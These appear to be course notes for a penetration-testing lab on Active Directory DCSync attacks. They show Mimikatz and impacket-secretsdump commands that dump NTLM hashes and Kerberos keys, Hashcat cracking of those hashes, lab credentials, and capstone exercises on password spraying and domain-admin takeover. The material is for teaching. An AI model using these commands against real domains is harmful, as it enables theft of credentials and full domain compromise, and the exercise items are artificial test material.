# Domain Controller Synchronization

Using Mimikatz to perform a dcsync attack to obtain the credentials of dave
>``` shell
>PS C:\Users\jeffadmin> cd C:\Tools\
>
>PS C:\Tools> .\mimikatz.exe
>
># ========== Expected Result ==========
>...
># =====================================
>
>mimikatz # lsadump::dcsync /user:corp\dave
>
># ========== Expected Result ==========
>[DC] 'corp.com' will be the domain
>[DC] 'DC1.corp.com' will be the DC server
>[DC] 'corp\dave' will be the user account
>[rpc] Service  : ldap
>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
>
>Object RDN           : dave
>
>** SAM ACCOUNT **
>
>SAM Username         : dave
>Account Type         : 30000000 ( USER_OBJECT )
>User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
>Account expiration   :
>Password last change : 9/7/2022 9:54:57 AM
>Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
>Object Relative ID   : 1103
>
>Credentials:
>    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
>    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
>    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
>    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
>    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
>...
># =====================================
>```

Using Hashcat to crack the NTLM hash obtained by the dcsync attack
>``` shell
>kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>
># ========== Expected Result ==========
>...
>08d7a47a6f9f66b97b1bae4178747494:Flowers1              
>...
># =====================================
>```

Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator Administrator
>``` shell
>mimikatz # lsadump::dcsync /user:corp\Administrator
>
># ========== Expected Result ==========
>...
>Credentials:
>  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
>...
># =====================================
>```

Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave
>``` shell
>kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
>[*] Using the DRSUAPI method to get NTDS.DIT secrets
>dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
>[*] Kerberos keys grabbed
>dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
>dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
>dave:des-cbc-md5:1a329b4338bfa215
>[*] Cleaning up...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to perform the dcsync attack to obtain the NTLM hash of the krbtgt account. Enter the NTLM hash as answer to this question.
>``` shell
>
>```
>

Lab 2 - Capstone Exercise: Once VM Group 2 is started, the domain corp.com has been modified. Use the techniques from this Module to obtain access to the user account maria and log in to the domain controller. To perform the initial enumeration steps you can use pete with the password Nexus123!. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of rockyou.txt.
>``` shell
>
>```
>

Lab 3 - Capstone Exercise: Once VM Group 3 is started, the domain corp.com has been modified. By examining leaked password database sites, you discovered that the password VimForPowerShell123! was previously used by a domain user. Spray this password against the domain users meg and backupuser. Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.
>``` shell
>
>```
>
